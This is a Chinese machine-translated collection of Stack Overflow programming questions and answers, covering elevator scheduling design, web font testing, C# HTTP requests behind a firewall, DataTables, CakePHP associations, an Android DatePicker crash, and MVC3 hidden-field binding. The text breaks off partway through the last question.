## 回答 #1

> 赞同：33
> 
> 时间：2012-08-17T16:46:38.260

由于您无法在软件中*实现*机制（尽管您当然可以对其进行*建模*），我认为问题是关于[*Elevator algorithm*](http://en.wikipedia.org/wiki/Elevator_algorithm)。

该算法看起来很简单，但实现起来却非常困难，即使手头有一套好的数据结构。该算法使用的一个很好的结构是三个优先级队列：

1.  对于条目超过当前点的当前方向，
2.  对于相反的方向，并且
3.  对于当前点之前的当前方向。

您的实现将首先确定方向，然后选择一个队列来放置请求的一对`{from, to}`值。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2015-07-01T17:13:33.803

如果我们使用两个链表，一个用于向上移动请求，另一个用于向下移动请求。

**例如**

**第一个请求：** a). 虽然电梯在 0 楼，但请求来到 3 楼。

向上移动的链表。

3->空。

向下移动的链表。

空值。

**第二个请求：** b）。电梯已移至 1 楼，而 2 楼提出向上移动的请求。

向上移动的链表。

2->3->空

向下移动的链表。

空值。

**第三个请求：** c) 假设 2 人进入 2 楼，一个人按下按钮进入 5 楼，另一个人进入 1 楼。

向上移动的链表。

3->5->空

注意：这里的 2 已经从上行链表中删除，因为它已经到达。

向下移动的链表。

1->空。

d) 假设一个人进入 3 楼并按下 0 楼的按钮

向上移动的链表。

5->空

向下移动的链表。

1->0->空。

一旦 iis 到达 5 楼，向上请求链表变为空，因此可以考虑移动向下链表。

**如果两个链表都是空的，那么电梯将处于静止状态。**

所以我认为链表也可以是电梯的有效数据结构

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2016-02-12T23:02:25.500

以下是设计电梯系统的一种方法。每个电梯都使用队列（可能是阻塞队列）来存储楼层请求。还有一个中央电梯管理器，它监控所有电梯队列，它可以根据一些业务规则将请求委托给某个电梯。ElevatorManager 的工作是有效地将请求委托给相关的电梯。下面的伪代码没有优化委托算法，但它显示了如何对电梯列表进行实际委托。

**电梯系统所需的类：**

**ElevatorManager** [Singleton - 这是管理建筑物中 n 部电梯的主电梯程序]
**成员：**
Floor.Request 的电梯
队列列表 // 这维护了两个方向的请求。一种改进可能是保留两个队列，每个方向一个，但它会增加复杂性
MIN_FLOOR
MAX_FLOOR
**操作：**
delgate()
halt() // 将整个电梯系统设置为维护模式或

**停止**操作 一座建筑物内可能有 n 部电梯]
**会员：**
楼层队列 // 这需要排序，因此可以使用 PriorityQueue
方向：枚举 [方向枚举 - 向上、向下、等待、空闲、维护]
CurrentFloor ：楼层
**操作：**
operate()
moveUp()
moveDown()
openDoor()
closeDoor()
callEmergencyLine()
getDirection()
getCurrentFloor()
setInMaintenanceMode()

**楼层**[代表各个楼层]
**成员：**
楼层数
类 Request {
currentFloor
destinationFloor
Direction [Up, Down]
}
**操作：**
goUp()
goDown()

**上面组件的一些主要伪代码：**

```
class Floor {
    goUp() {
        ElevatorManager.queue.offer(new Request(currentFloor, destinationFloor, up));
    }   

    goDown() {
        ElevatorManager.queue.offer(new Request(currentFloor, destinationFloor, down));
    }
}

ElevatorManager {
    delegate() {

        // Instead of using one object, we could use a list to track idle and elevators moving in same direction so that these list could be used for next requests in queue
        // but again to simplify pseudocode, I am using single objects instead of lists
        Elevator idleElevator; // track idle elevator
        Elevator elevatorMovingInSameDirection; // elevator moving in same direction as next request in main elevator manager queue 

        while(!halt()) { //keep delegating until powered down or whole system is halted through main controls

            if(queue.peek() != null) {

                Request req = queue.peek();
                boolean startAgain = false; // flag to start from beginning if the request is already pushed to one of the elevators queue during iterating elevators

                for(Elevator elevator : elevators) {

                    // first find if there is an elevator at current floor going in same direction as current request in queue
                    if(req.currentFloor == elevator.currentFloor && req.direction == elevator.direction) {
                        elevator.queue.offer(req.destinationFloor);
                        queue.poll(); // remove this request from Elevator Manager queue

                        startAgain = true;
                        break;
                    }

                    // check if this elevator is idle
                    if(elevator.direction == "idle")) {
                        idleElevator = elevator; // For this simple design, I am ok to overwrite idle elevator value and instead get the latest idle elevatior
                    }

                    // check if this elevator is moving in desired direction and elevator's current floor is behind desired floor in queue
                    if(elevator.direction == req.direction) {

                        // Make sure elevators moving in same direction should also be behind the floor where request is made
                        if(req.direction == "Up" && req.currentFloor - elevator.currentFloor > 0) {

                            elevatorMovingInSameDirection = elevator; // Same as above, it's ok to get this overwritten and instead get the latest elevator moving in same      direction
                        }

                        // Make sure elevators moving in same direction should also be behind the floor where request is made
                        if(req.direction == "Down" && req.currentFloor - elevator.currentFloor < 0) {
                            elevatorMovingInSameDirection = elevator;
                        }
                    }

                }

                // Only delegate to other floors if you could not find elevator going in same direction at same floor from where the request was made
                if(!startAgain && idleElevator != null) {
                    idleElevator.queue.offer(req.destinationFloor);
                    queue.poll();
                }

                // if we could neither find elevator at current floor nor idle elevator then send this request to elevator behind current Floor and moving in same direction as the request
                if(!startAgain && elevatorMovingInSameDirection != null) {
                    elevatorMovingInSameDirection.queue.offer(req.destinationFloor);
                    queue.poll();
                }

            }
        }
    }
}

Elevator {

    moveUp() {
        this.currentFloor += 1;
    }

    moveDown() {
        this.currentFloor -= 1;
    }

    operate() {

        while(queue.peek() != null) {

            Floor nextFloorInQueue = queue.peek();

            while(this.currentFloor != nextFloorInQueue.request.destinationFloor) {
                if(this.direction == "Up") {
                    moveUp();
                } else if(this.direction == "down") {
                    moveDown();
                }
            }

            queue.poll(); // remove the request from queue
            open(); //open door

            Direction backUpDirection = this.direction; //back up elevators direction to retrieve it later once dooor closes
            this.direction = "idle"; // set state to idle to let elevatorManager know that requests at current floor could be offered to this elevator queue

            Thread.sleep(10000); // sleep for 10 seconds so that people can leave elevator

            close(); // once people are out close door to move to next floor in queue
            this.direction = backUpDirection;
        }

        this.direction = "idle"; // once queue is empty set the direction to idle
    }
} 
```

它也可以在我的 Github 上找到：[https ://github.com/prabhash1785/Java/blob/master/ObjectOrientedDesign/src/com/prabhash/java/design/objectoriented/elevator/ElevatorDesignWithPseudocode.md](https://github.com/prabhash1785/Java/blob/master/ObjectOrientedDesign/src/com/prabhash/java/design/objectoriented/elevator/ElevatorDesignWithPseudocode.md)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2016-09-13T15:08:07.420

为简单起见，让我们考虑一个 *单一*的电梯系统。

使用的数据结构：用于存储楼层#、事件和状态**枚举的简单****列表。**

 **该系统可以由*事件状态*驱动。用户行为或环境的每个方面都必须在决定所有场景都可以扔到电梯上时加以注意。

```
Events of the elevator : GOINGUP, GOINGDOWN, STOP 
States of the elevator : ONMOVE, WAITING (between door open and close), IDLE (serving no one), UNDERMAINTENANCE

Elevator movement is usually driven by two activites:
1\. Press Up or Down key (before the entry gate of elevator) and wait for the elevator to come and serve you. (Press-And-Wait, say PAW) 
2\. Enter inside the elevator and make request by pressing keys (Enter-And-Request, say EAR)

So it can said that PAW from outside and EAR from inside can decide the hops of the elevator. But what about direction?

Two possible types of PAW: PAWup (press Up button) and PAWdown (press Down button)

Now, EAR can be any of the three types depending upon the users behavior. These are the critical challenges in deciding the algorithm: 
1.) Normal - same direction as PAW (wanted to go down and enter lower floor#) 
2.) Opposite - wanted to go down BUT enter higher floor#
3.) Indecisive - Do Nothing, no key press

Now comes all the important rules:
RULE 1: If at IDLE, use FCFS to decide between the DownList front and UpList front - whoever is oldest, serve it first to ensure less waiting time. 
RULE 2: When both lists (DownList and UpList) are empty, move elevator to IDLE state. 
RULE 3: Elevator state change GOINGUP->STOP clears that floor# from UpList. Similarly, GOINGDOWN->STOP clears that floor from DownList.
RULE 4: Absolute Zero Skipping: GOINGxxx serves as many floors in xxxList as possible. 
RULE 5: Elevator doesn't favour Opposite-EAR, and obviously can't serve Indecisive-EAR.
RULE 6: Elevator in UNDERMAINTENANCE state is shunned from all external signals.
RULE 7: In the event of Power-cuts or Fire, the elevator goes and stops at Lobby. Flooding??

To achieve RULE#5, GOINGDOWN clears all the lower floor# in DownList in ONE GO. Similarly, GOINGUP clears all the higher floor# in UpList.    

Lets discuss one scenario to clear the above concepts:
Say, an elevator is resting at floor 7 is at IDLE state, 
    DownList : 
    UpList : 

IDLE@7 - PAWdown@12 then PAWup@9 then PAWdown@13
    DownList : 12, 13 (older requests at lower index.Push new requests at front.)
    UpList : 9 
    Using RULE#2, in the above case, 
    Event: GOINGUP to Pick@12\.  

WAITING@12  - 12 cleared following RULE#3

MeanWhile, PAWup@8 then PAWup@10 then PAWdown@10, so updated lists are:
    DownList : 13, 10 
    UpList : 9, 8, 10

So here, in the current situation, if the EAR is
1.) Normal, GOINGDOWN(towards new EAR) is triggered.
2.) Opposite/Indecisive, GOINGDOWN(towards 9) is triggered and add the new EAR in UpList. 
```

使用上述规则，电梯继续其正常工作。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2014-09-26T22:58:20.077

拥有一个数组怎么样，其中每个数组条目代表一个楼层。当用户想停到某个楼层时，他会在阵列中标记该条目，如果电梯到达该楼层时，电梯将查看阵列并清除该条目。类似于 SCAN/CSAN 调度算法。我期待你的评论**

# css - 如何在我的网页上测试网页嵌入字体？

> ID：12009558
> 
> 赞同：4
> 
> 时间：2012-08-17T16:25:31.643
> 
> 标签：css, embed, webfonts

我正在开发一个需要嵌入字体的网站。

一切看起来都很棒，除非我从我的机器中删除本地 Prelo 字体（备份它们），字体在浏览器中停止工作。当然，这是因为我的代码中有一个错误，我修复了它，它又可以工作了。

（所以问题是......是否有“禁用”本地字体或告诉浏览器不要在本地查找所需系统字体以外的字体的解决方法？）

除了在本地删除字体以在浏览器中测试之外，还有其他方法吗？如果 Chrome 和 FF 找不到嵌入的字体，它们似乎默认为我的系统字体。

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T16:28:22.893

只需重命名您要测试的字体，确保它不是您在本地拥有的名称。

IE：

改变：

```
@font-face {
    font-family: System;
     font-style:  normal;
    src: url(system.eot);
}

div {
    font-family: System;
} 
```

至

```
@font-face {
    font-family: WebTest;
    font-style:  normal;
    src: url(system.eot);
}

div {
    font-family: WebTest;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-10-28T04:19:08.780

Type Wonder 可让您输入 URL 并选择网络字体。然后它会向您展示您的页面使用新字体后的样子。很光滑。

[http://typewonder.com](http://typewonder.com)

# c# - HttpWebRequest.Create 和防火墙

> ID：12009559
> 
> 赞同：0
> 
> 时间：2012-08-17T16:25:42.630
> 
> 标签：c#, httpwebrequest, httpwebresponse, system.net

我需要检查给定主机是否正在回复 HTTP Web 请求。所以，我需要做的就是 HttpWebRequest.Create(someURI) 并检查响应，对吧？

```
HttpWebRequest webRequest = (HttpWebRequest)HttpWebRequest.Create(targetUri);

TimeSpan timeOut = TimeSpan.FromSeconds(timeOutInSeconds);
webRequest.Timeout = (int)timeOut.TotalMilliseconds;
webRequest.Proxy = proxy;
webRequest.AllowAutoRedirect = false; // get extra information with this turned off, but doesn't affect the problem

response = webRequest.GetResponse() as HttpWebResponse; 
```

好吧，出现的问题是，如果 someURI 被我们的防火墙阻止（例如“gibber.com”被阻止），那么我会返回一个有效的 HttpWebResponse，它不会抛出，并且 ResponseURI 属性设置为被阻止URI（“gibber.com”）即使它实际上是我们的服务器响应。

在 HTTP 标头中会有一个 Location 键，它的值是本地服务器的 IP。但是我不想解析文本来确定请求是否真的被退回。这样做的正确方法是什么？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T17:57:25.253

检查 response.ResponseUri 是否对应于给定的主机或您的防火墙。

# jquery - 数据表多列过滤器和分页

> ID：12009565
> 
> 赞同：1
> 
> 时间：2012-08-17T16:25:59.360
> 
> 标签：jquery, jquery-datatables

分页和多列过滤是否在数据表中协同工作？

我结合了两个样本源

[http://datatables.net/examples/api/multi_filter.html](http://datatables.net/development/pagination)

和

[http://datatables.net/development/pagination](http://datatables.net/development/pagination)

我没有得到任何编译错误。分页将起作用。在其中一个列中输入值以过滤记录时，它会给出一个 javascript 错误 TypeError G is null

每个来源都独立工作，但它们不能很好地协同工作。有什么想法吗？

# cakephp - 在视图中显示 HABTM 数据

> ID：12009566
> 
> 赞同：0
> 
> 时间：2012-08-17T16:26:02.370
> 
> 标签：cakephp

我有一个使用烘焙脚本烘焙的简单 cakephp 2.x 应用程序。两个主要表格是条件和药物。条件 HABTM 药物，反之亦然。我试图在条件索引中显示属于条件的药物，基本列出所有条件，但只列出那些药物。我试过这样做，在逗号分隔的列表中显示属于某个条件的药物，该列表适用于另一个 1.3 应用程序：

```
<?php 
    $condition_drugs = '';
    foreach($condition['Drug'] as $drug):
      $condition_drugs .= $drug['drug'] . ', ';
      //echo $drug['generic'];
    endforeach;
    //echo substr($condition_drugs, 0, -2);
    echo $condition_drugs;
?> 
```

但它给出了以下两个错误：未定义的索引：药物 [APP/View/Conditions/index.ctp，第 22 行]，以及为 foreach() 提供的无效参数 [APP/View/Conditions/index.ctp，第 22 行]

我还在这里查看了另一篇文章，该文章建议以类似的方式进行操作。我的代码有问题吗？我需要根据 ID 在我的模型中查找吗？这是完整的索引视图代码和控制器：

看法：

```
<div class="conditions index">
    <h2><?php echo __('Conditions'); ?></h2>
    <table cellpadding="0" cellspacing="0">
    <tr>
            <th><?php echo $this->Paginator->sort('condition'); ?></th>
            <th><?php echo $this->Paginator->sort('principles'); ?></th>
            <th><?php echo $this->Paginator->sort('treatment'); ?></th>
            <th><?php echo $this->Paginator->sort('clinical_tips'); ?></th>
            <th>Drugs</th>
            <th class="actions"><?php echo __('Actions'); ?></th>
    </tr>
    <?php
    foreach ($conditions as $condition): ?>
    <tr>
        <td><?php echo h($condition['Condition']['condition']); ?>&nbsp;</td>
        <td><?php echo h($condition['Condition']['principles']); ?>&nbsp;</td>
        <td><?php echo h($condition['Condition']['treatment']); ?>&nbsp;</td>
        <td><?php echo h($condition['Condition']['clinical_tips']); ?>&nbsp;</td>
    <td>
        <?php 
            $condition_drugs = '';
            foreach($condition['Drug'] as $drug):
              $condition_drugs .= $drug['drug'] . ', ';
              //echo $drug['generic'];
            endforeach;
            //echo substr($condition_drugs, 0, -2);
            echo $condition_drugs;
        ?>
    </td>
        <td class="actions">
            <?php echo $this->Html->link(__('View'), array('action' => 'view', $condition['Condition']['id'])); ?>
            <?php echo $this->Html->link(__('Edit'), array('action' => 'edit', $condition['Condition']['id'])); ?>
            <?php echo $this->Form->postLink(__('Delete'), array('action' => 'delete', $condition['Condition']['id']), null, __('Are you sure you want to delete # %s?', $condition['Condition']['id'])); ?>
        </td>
    </tr>
<?php endforeach; ?>
    </table>
    <p>
    <?php
    echo $this->Paginator->counter(array(
    'format' => __('Page {:page} of {:pages}, showing {:current} records out of {:count} total, starting on record {:start}, ending on {:end}')
    ));
    ?>  </p>

    <div class="paging">
    <?php
        echo $this->Paginator->prev('< ' . __('previous'), array(), null, array('class' => 'prev disabled'));
        echo $this->Paginator->numbers(array('separator' => ''));
        echo $this->Paginator->next(__('next') . ' >', array(), null, array('class' => 'next disabled'));
    ?>
    </div>
</div>
<div class="actions">
    <h3><?php echo __('Actions'); ?></h3>
    <ul>
        <li><?php echo $this->Html->link(__('New Condition'), array('action' => 'add')); ?></li>
    </ul>
</div> 
```

控制器：

```
<?php
App::uses('AppController', 'Controller');
/**
 * Conditions Controller
 *
 * @property Condition $Condition
 */
class ConditionsController extends AppController {

/**
 * index method
 *
 * @return void
 */
    public function index() {
    $this->set('title_for_layout','Condition Index');
        $this->Condition->recursive = 0;
        $this->set('conditions', $this->paginate());
    }

/**
 * view method
 *
 * @throws NotFoundException
 * @param string $id
 * @return void
 */
    public function view($id = null) {
        $this->Condition->id = $id;
        if (!$this->Condition->exists()) {
            throw new NotFoundException(__('Invalid condition'));
        }
        $this->set('condition', $this->Condition->read(null, $id));
    }

/**
 * add method
 *
 * @return void
 */
    public function add() {
        if ($this->request->is('post')) {
            $this->Condition->create();
            if ($this->Condition->save($this->request->data)) {
                $this->Session->setFlash(__('The condition has been saved'));
                $this->redirect(array('action' => 'index'));
            } else {
                $this->Session->setFlash(__('The condition could not be saved. Please, try again.'));
            }
        }
    $drugs = $this->Condition->Drug->find('list',array('fields'=>array('id','generic')));
    $this->set(compact('drugs'));
    }

/**
 * edit method
 *
 * @throws NotFoundException
 * @param string $id
 * @return void
 */
    public function edit($id = null) {
        $this->Condition->id = $id;
        if (!$this->Condition->exists()) {
            throw new NotFoundException(__('Invalid condition'));
        }
        if ($this->request->is('post') || $this->request->is('put')) {
            if ($this->Condition->save($this->request->data)) {
                $this->Session->setFlash(__('The condition has been saved'));
                $this->redirect(array('action' => 'index'));
            } else {
                $this->Session->setFlash(__('The condition could not be saved. Please, try again.'));
            }
        } else {
            $this->request->data = $this->Condition->read(null, $id);
        }
    $drugs = $this->Condition->Drug->find('list',array('fields'=>array('id','generic')));
    $this->set(compact('drugs'));
    }

/**
 * delete method
 *
 * @throws MethodNotAllowedException
 * @throws NotFoundException
 * @param string $id
 * @return void
 */
    public function delete($id = null) {
        if (!$this->request->is('post')) {
            throw new MethodNotAllowedException();
        }
        $this->Condition->id = $id;
        if (!$this->Condition->exists()) {
            throw new NotFoundException(__('Invalid condition'));
        }
        if ($this->Condition->delete()) {
            $this->Session->setFlash(__('Condition deleted'));
            $this->redirect(array('action' => 'index'));
        }
        $this->Session->setFlash(__('Condition was not deleted'));
        $this->redirect(array('action' => 'index'));
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T18:18:08.153

要包含 habtm 数据，您需要 $recursive = 1; 您已将其设置为 0

# android - DatePicker 因 NullPointerException 而崩溃

> ID：12009577
> 
> 赞同：1
> 
> 时间：2012-08-17T16:26:50.280
> 
> 标签：android, datepicker

目前我将 a 应用`DatePicker`到我的应用程序中，当我单击 时`Button`，它崩溃了。下面是logcat：

```
08-18 00:22:39.564: E/AndroidRuntime(793): FATAL EXCEPTION: main
08-18 00:22:39.564: E/AndroidRuntime(793): java.lang.RuntimeException: Unable to start activity  ComponentInfo{com.stts.sparetimetradingsystem/com.stts.sparetimetradingsystem.employer.EditEventActivity}:  java.lang.NullPointerException
08-18 00:22:39.564: E/AndroidRuntime(793):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2663)
08-18 00:22:39.564: E/AndroidRuntime(793):  at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2679)
08-18 00:22:39.564: E/AndroidRuntime(793):  at android.app.ActivityThread.access$2300(ActivityThread.java:125)
08-18 00:22:39.564: E/AndroidRuntime(793):  at android.app.ActivityThread$H.handleMessage(ActivityThread.java:2033)
08-18 00:22:39.564: E/AndroidRuntime(793):  at android.os.Handler.dispatchMessage(Handler.java:99)
08-18 00:22:39.564: E/AndroidRuntime(793):  at android.os.Looper.loop(Looper.java:123)
08-18 00:22:39.564: E/AndroidRuntime(793):  at android.app.ActivityThread.main(ActivityThread.java:4627)
08-18 00:22:39.564: E/AndroidRuntime(793):  at java.lang.reflect.Method.invokeNative(Native Method)
08-18 00:22:39.564: E/AndroidRuntime(793):  at java.lang.reflect.Method.invoke(Method.java:521)
08-18 00:22:39.564: E/AndroidRuntime(793):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:868)
08-18 00:22:39.564: E/AndroidRuntime(793):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:626)
08-18 00:22:39.564: E/AndroidRuntime(793):  at dalvik.system.NativeStart.main(Native Method)
08-18 00:22:39.564: E/AndroidRuntime(793): Caused by: java.lang.NullPointerException
08-18 00:22:39.564: E/AndroidRuntime(793):  at com.stts.sparetimetradingsystem.employer.EditEventActivity.updateDisplayFrom(EditEventActivity.java:532)
08-18 00:22:39.564: E/AndroidRuntime(793):  at com.stts.sparetimetradingsystem.employer.EditEventActivity.onCreate(EditEventActivity.java:236)
08-18 00:22:39.564: E/AndroidRuntime(793):  at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1047)
08-18 00:22:39.564: E/AndroidRuntime(793):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2627)
08-18 00:22:39.564: E/AndroidRuntime(793):  ... 11 more 
```

很抱歉没有放置我的代码。这是我的代码：

```
private int mYear;
private int mMonth;
private int mDay;
static final int DATE_DIALOG_ID = 0;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.edit_event);

    edit_eventSpinner = (Spinner) findViewById(R.id.edit_spinner);
    btnSaveEvent = (Button) findViewById(R.id.btnSaveEvent);
    btnDeleteEvent = (Button) findViewById(R.id.btnDeleteEvent);
    edit_error = (TextView) findViewById(R.id.edit_error);

    ArrayAdapter<CharSequence> adapter = ArrayAdapter.createFromResource(
            this, R.array.salary_array,
            android.R.layout.simple_spinner_item);
    adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);

    edit_eventSpinner.setAdapter(adapter);
    edit_eventSpinner
            .setOnItemSelectedListener(new OnItemSelectedListener() {
                public void onItemSelected(AdapterView<?> parent,
                        View view, int position, long id) {

                    if (position == 0) {
                        rate = "/hour";
                    } else if (position == 1) {
                        rate = "/day";
                    } else {
                        rate = "/month";
                    }
                }

                public void onNothingSelected(AdapterView<?> parent) {

                }
            });

    // getting event details from intent
    Intent i = getIntent();

    // getting event id (EID) from intent
    eid = i.getStringExtra(TAG_EID);

    // Getting complete event details in background thread
    new GetEventDetails().execute();

    // save button click event
    btnSaveEvent.setOnClickListener(new View.OnClickListener() {

        public void onClick(View arg0) {
            // starting background task to update event
            String e = edit_eventName.getText().toString();
            String c = edit_eventCName.getText().toString();
            String s = edit_eventSalary.getText().toString();
            String f = edit_eventFrom.getText().toString();
            String t = edit_eventTo.getText().toString();
            String whf = edit_eventWHFrom.getText().toString();
            String wht = edit_eventWHTo.getText().toString();
    });

    // Delete button click event
    btnDeleteEvent.setOnClickListener(new View.OnClickListener() {

        public void onClick(View arg0) {
            // deleting event in background thread
            new DeleteEvent().execute();
        }
    });

    Button edit_pickDateFrom = (Button) findViewById(R.id.edit_pickDateFrom);

    edit_pickDateFrom.setOnClickListener(new View.OnClickListener() {
        public void onClick(View v) {
            showDialog(DATE_DIALOG_ID);
        }
    });

    updateDisplayFrom();
}

@Override
protected Dialog onCreateDialog(int id) {
    switch (id) {

    case DATE_DIALOG_ID:
        return new DatePickerDialog(this, mDateSetListenerFrom, mYear,
                mMonth, mDay);
    }
    return null;
}

protected void onPrepareDialog(int id, Dialog dialog) {
    switch (id) {

    case DATE_DIALOG_ID:
        ((DatePickerDialog) dialog).updateDate(mYear, mMonth, mDay);
        break;
    }

}

// SET THE DATE FORMAT ALREADY USER SELECT FROM THE DATEPICKER
private void updateDisplayFrom() {
    edit_eventFrom.setText(new StringBuilder()
            // Month is 0 based so add 1
            .append(mDay).append("-").append(mMonth + 1).append("-")
            .append(mYear).append(""));
}

private DatePickerDialog.OnDateSetListener mDateSetListenerFrom = new DatePickerDialog.OnDateSetListener() {

    public void onDateSet(DatePicker view, int year, int monthOfYear,
            int dayOfMonth) {
        mYear = year;
        mMonth = monthOfYear;
        mDay = dayOfMonth;
        updateDisplayFrom();
    }
}; 
```

下面是我得到的新错误，即使我初始化了 edit_eventName 等。

```
08-18 01:09:56.764: E/AndroidRuntime(977): FATAL EXCEPTION: main
08-18 01:09:56.764: E/AndroidRuntime(977): java.lang.IllegalArgumentException: current should be >= start and <= end
08-18 01:09:56.764: E/AndroidRuntime(977):  at android.widget.NumberPicker.setCurrent(NumberPicker.java:288)
08-18 01:09:56.764: E/AndroidRuntime(977):  at android.widget.DatePicker.updateDaySpinner(DatePicker.java:364)
08-18 01:09:56.764: E/AndroidRuntime(977):  at android.widget.DatePicker.updateSpinners(DatePicker.java:350)
08-18 01:09:56.764: E/AndroidRuntime(977):  at android.widget.DatePicker.init(DatePicker.java:346)
08-18 01:09:56.764: E/AndroidRuntime(977):  at android.app.DatePickerDialog.<init>(DatePickerDialog.java:124)
08-18 01:09:56.764: E/AndroidRuntime(977):  at android.app.DatePickerDialog.<init>(DatePickerDialog.java:83)
08-18 01:09:56.764: E/AndroidRuntime(977):  at com.stts.sparetimetradingsystem.employer.EditEventActivity.onCreateDialog(EditEventActivity.java:527)
08-18 01:09:56.764: E/AndroidRuntime(977):  at android.app.Activity.onCreateDialog(Activity.java:2472)
08-18 01:09:56.764: E/AndroidRuntime(977):  at android.app.Activity.createDialog(Activity.java:881)
08-18 01:09:56.764: E/AndroidRuntime(977):  at android.app.Activity.showDialog(Activity.java:2547)
08-18 01:09:56.764: E/AndroidRuntime(977):  at android.app.Activity.showDialog(Activity.java:2514)
08-18 01:09:56.764: E/AndroidRuntime(977):  at com.stts.sparetimetradingsystem.employer.EditEventActivity$5.onClick(EditEventActivity.java:245)
08-18 01:09:56.764: E/AndroidRuntime(977):  at android.view.View.performClick(View.java:2408)
08-18 01:09:56.764: E/AndroidRuntime(977):  at android.view.View$PerformClick.run(View.java:8816)
08-18 01:09:56.764: E/AndroidRuntime(977):  at android.os.Handler.handleCallback(Handler.java:587)
08-18 01:09:56.764: E/AndroidRuntime(977):  at android.os.Handler.dispatchMessage(Handler.java:92)
08-18 01:09:56.764: E/AndroidRuntime(977):  at android.os.Looper.loop(Looper.java:123)
08-18 01:09:56.764: E/AndroidRuntime(977):  at android.app.ActivityThread.main(ActivityThread.java:4627)
08-18 01:09:56.764: E/AndroidRuntime(977):  at java.lang.reflect.Method.invokeNative(Native Method)
08-18 01:09:56.764: E/AndroidRuntime(977):  at java.lang.reflect.Method.invoke(Method.java:521)
08-18 01:09:56.764: E/AndroidRuntime(977):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:868)
08-18 01:09:56.764: E/AndroidRuntime(977):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:626)
08-18 01:09:56.764: E/AndroidRuntime(977):  at dalvik.system.NativeStart.main(Native Method) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T16:47:33.590

似乎您`edit_eventFrom`在发布的代码中的任何地方都没有初始化。

你需要`View`从你的布局中膨胀它，就像你做其他的一样`Views`：

```
edit_eventSpinner = (Spinner) findViewById(R.id.edit_spinner);
btnSaveEvent = (Button) findViewById(R.id.btnSaveEvent);
btnDeleteEvent = (Button) findViewById(R.id.btnDeleteEvent);
edit_error = (TextView) findViewById(R.id.edit_error); 
```

正如*swayam*提到的，您需要为`View`您想要在代码中使用的任何内容执行此操作。

> *斯威亚姆*
> 
> 同样，在您的代码中使用之前初始化所有以下 EditText 视图

* * *

**第二个错误**

> IllegalArgumentException: current 应该 >= start 和 <= end

您需要初始化`mYear`,`mDay`并`mMonth`设置为默认值或您想要的任何值。

[此解决方案的参考。](https://stackoverflow.com/questions/7753309/java-lang-illegalargumentexception-current-should-be-start-and-end)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T16:56:58.320

您缺少参考 XML 的 EditText 视图的**初始化。**

```
EditText edit_eventName = (EditText) findViewById(R.id.idOfThisEditTextInYourXML);
EditText edit_eventFrom = (EditText) findViewById(R.id.idOfThisEditTextInYourXML); 
```

同样，在您的代码中使用之前初始化所有以下 EditText 视图：

```
 edit_eventCName
            edit_eventSalary
            edit_eventFrom
            edit_eventTo
            edit_eventWHFrom
            edit_eventWHTo 
```

您还**缺少**. `mDay, mMonth and mYear`您需要为它们分配一些值（整数）。

```
private int mYear = 2012; // example value
private int mMonth = 7; // example value
private int mDay =17; // example value 
```

# c# - MVC3 模型绑定 - 隐藏字段列表

> ID：12009578
> 
> 赞同：3
> 
> 时间：2012-08-17T16:26:53.210
> 
> 标签：c#, asp.net-mvc-3, razor, views, model-binding

我有一个特殊的问题 - 我有一个带有列表的 ViewModel，用于显示图像列表：

```
public List<int> TrackerKeys { get; set; } 
```

这在页面的两个地方使用：

```
@for (int i = 0; i < Model.TrackerKeys.Count(); i++)
{ 
    @Html.GenerateImage(PageModes.Http, Model.TrackerKeys[i])
} 
```

并且

```
@for (int i = 0; i < Model.TrackerKeys.Count(); i++)
{ 
    @Html.HiddenFor(model => model.TrackerKeys[i])
} 
```

这位于表单内 - 当表单提交时，如果发生验证错误，则 TrackerKeys 属性将更新为一组新的随机数字。我将先前的列表传回以确保用户不会再次看到相同的图像。

跟踪器键已正确设置并传递回视图。

**我的问题是：**

图像根据列表中的新值正确显示新图像

**然而**

隐藏字段的值不会更新为新值 - 它们保留原始值。

有任何想法吗？这是 MVC3 的错误吗？任何投入将不胜感激。谢谢你。

**编辑**

提交前的html：

```
<img alt="Security Character" height="35" src="http://localhost:51414/content/imagescss/26.gif" width="35" />
<img alt="Security Character" height="35" src="http://localhost:51414/content/imagescss/33.gif" width="35" />
<img alt="Security Character" height="35" src="http://localhost:51414/content/imagescss/8.gif" width="35" />
<img alt="Security Character" height="35" src="http://localhost:51414/content/imagescss/30.gif" width="35" />
<img alt="Security Character" height="35" src="http://localhost:51414/content/imagescss/6.gif" width="35" />
<img alt="Security Character" height="35" src="http://localhost:51414/content/imagescss/18.gif" width="35" /> 
```

和

```
<input id="TrackerKeys_0_" name="TrackerKeys[0]" type="hidden" value="26" />
<input id="TrackerKeys_1_" name="TrackerKeys[1]" type="hidden" value="33" />
<input id="TrackerKeys_2_" name="TrackerKeys[2]" type="hidden" value="8" />
<input id="TrackerKeys_3_" name="TrackerKeys[3]" type="hidden" value="30" />
<input id="TrackerKeys_4_" name="TrackerKeys[4]" type="hidden" value="6" />
<input id="TrackerKeys_5_" name="TrackerKeys[5]" type="hidden" value="18" /> 
```

在帖子之后：在此处更正新值...

```
<img alt="Security Character" height="35" src="http://localhost:51414/content/imagescss/16.gif" width="35" />
<img alt="Security Character" height="35" src="http://localhost:51414/content/imagescss/20.gif" width="35" />
<img alt="Security Character" height="35" src="http://localhost:51414/content/imagescss/11.gif" width="35" />
<img alt="Security Character" height="35" src="http://localhost:51414/content/imagescss/19.gif" width="35" />
